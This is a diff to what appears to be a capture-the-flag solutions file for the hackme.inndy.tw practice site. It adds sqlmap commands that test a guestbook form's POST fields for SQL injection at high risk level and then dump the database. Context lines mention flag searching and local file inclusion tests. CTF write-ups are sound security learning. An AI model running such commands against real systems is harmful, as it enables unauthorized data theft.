@@ -16,6 +16,12 @@
 ## 15
   search `FLAG{` on index page
 
+## 16 guestbook
+  ```
+  sqlmap -u "https://hackme.inndy.tw/gb/?mod=post" --method POST -p "content,title" --data "title=a&content=b" --level=3 --risk=3
+  sqlmap -u "https://hackme.inndy.tw/gb/?mod=post" --method POST -p "content,title" --data "title=abx&content=asdb" --dump
+  ```
+
 ## 17
   ```
     # test LFI
